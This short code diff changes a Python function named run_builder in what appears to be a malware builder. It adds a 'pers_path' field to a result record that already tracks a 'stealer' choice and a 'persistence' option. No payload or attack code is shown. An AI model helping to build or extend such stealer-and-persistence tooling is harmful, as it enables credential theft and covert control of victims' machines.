@@ -5640,6 +5640,7 @@ def run_builder() -> None:
                             "stealer":     slug,
                             "persistence": pers_choice or "none",
                             "out_path":    str(s_out.relative_to(Path(__file__).parent)) if s_ok and s_out else None,
+                            "pers_path":   str(p_out.relative_to(Path(__file__).parent)) if p_ok and p_out and p_out.exists() else None,
                         },
                         "status":     "success" if s_ok else "failed",
                         "output":     s_log + ("\n" + p_log if p_log else ""),
